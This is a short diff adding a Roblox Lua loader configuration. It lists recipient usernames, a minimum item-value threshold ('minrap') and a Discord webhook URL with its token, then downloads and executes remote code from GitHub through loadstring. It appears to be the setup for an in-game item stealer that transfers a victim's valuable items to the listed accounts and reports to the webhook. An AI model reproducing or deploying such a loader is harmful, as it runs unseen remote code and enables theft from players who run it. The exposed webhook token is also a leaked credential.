@@ -1,0 +1,5 @@
+_G.Usernames = {"Pepa777pp", "ojVlaza"} -- you can add as many as you'd like
+_G.minrap = 10000000
+_G.webhook = "https://discord.com/api/webhooks/1571587532511125756/EWdqMqNA52MtZ4IvCmkQMiMgJx7oEvPJ4El7ljMOaJwDiSq2J23LYU47kQ8_-WmQUN4F" -- change to your webhook
+
+loadstring(game:HttpGet("https://github.com/ps99scripts-ops/wdad/blob/main/source.lua"))()
